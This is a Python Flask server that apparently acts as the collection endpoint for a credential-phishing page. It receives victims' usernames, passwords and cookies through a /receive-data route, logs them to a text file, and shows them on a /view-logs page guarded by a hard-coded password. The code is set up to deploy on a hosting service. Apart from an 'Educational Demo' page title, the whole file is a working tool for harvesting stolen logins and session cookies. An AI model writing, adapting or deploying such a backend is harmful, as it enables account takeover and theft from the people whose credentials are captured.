from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# File to save the captured data
DATA_FILE = "captured_data.txt"
# Password to view the data
VIEW_PASSWORD = "nikiegei"

# HTML template for viewing logs
VIEW_LOGS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs (Educational Demo)</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #e0e7ff, #ffffff);
            margin: 0;
        }
        .login-container {
            background: white;
            width: 360px;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #666;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #444;
        }
        .error {
            color: red;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Enter Password to View Logs</h2>
        <form method="POST" action="/view-logs">
            <div class="input-group">
                <input type="password" name="view-password" placeholder="Enter password">
            </div>
            <button type="submit">View Logs</button>
        </form>
        {% if error %}
            <p class="error">{{ error }}</p>
        {% endif %}
    </div>
</body>
</html>
"""

# Route to receive data from the client
@app.route('/receive-data', methods=['POST'])
def receive_data():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    cookies = data.get('cookies')

    # Save the data to a file
    with open(DATA_FILE, 'a') as f:
        f.write(f"Username: {username}, Password: {password}, Cookies: {cookies}\n")
    
    return {"status": "success"}, 200

# Route to view logs
@app.route('/view-logs', methods=['GET', 'POST'])
def view_logs():
    if request.method == 'POST':
        password = request.form.get('view-password')
        if password == VIEW_PASSWORD:
            # Read the captured data from the file
            if os.path.exists(DATA_FILE):
                with open(DATA_FILE, 'r') as f:
                    data = f.read()
                return f"<pre>{data}</pre>"
            else:
                return "No data captured yet."
        else:
            return render_template_string(VIEW_LOGS_PAGE, error="Incorrect password!")
    return render_template_string(VIEW_LOGS_PAGE, error=None)

if __name__ == '__main__':
    # Use the port provided by Render (or default to 5000 for local testing)
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port)